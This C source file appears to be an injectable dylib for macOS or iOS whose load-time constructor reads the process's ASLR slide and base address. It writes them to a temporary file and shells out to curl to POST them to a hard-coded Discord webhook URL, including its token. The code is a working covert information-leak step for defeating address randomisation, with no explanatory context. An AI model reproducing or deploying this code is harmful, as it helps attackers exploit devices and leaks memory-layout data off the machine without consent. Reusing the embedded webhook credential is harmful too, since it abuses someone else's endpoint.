#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <mach-o/dyld.h>

__attribute__((constructor))
void send_aslr_info(void) {
    uintptr_t slide = _dyld_get_image_vmaddr_slide(0);
    uintptr_t base  = (uintptr_t)_dyld_get_image_header(0);

    char payload[512];
    snprintf(payload, sizeof(payload),
             "{\"content\":\"**ASLR Slide:** 0x%lx\\n**Base Address:** 0x%lx\"}",
             slide, base);

    const char *temp_file = "/tmp/aslr_info.json";
    FILE *fp = fopen(temp_file, "w");
    if (fp != NULL) {
        fputs(payload, fp);
        fclose(fp);

        // Headerless networking via native iOS curl
        char cmd[1024];
        snprintf(cmd, sizeof(cmd),
                 "/usr/bin/curl -s -X POST "
                 "-H 'Content-Type: application/json' "
                 "--data-binary @%s "
                 "https://discord.com/api/webhooks/1428780310451196048/Ps9b7xw3Tg1D5RPJka-AMg4Sfl_Elrw2bFO-Gvdgrhx-u8Aa9bxhjA2luPp9qhUvrehF",
                 temp_file);
        system(cmd);
    }
}
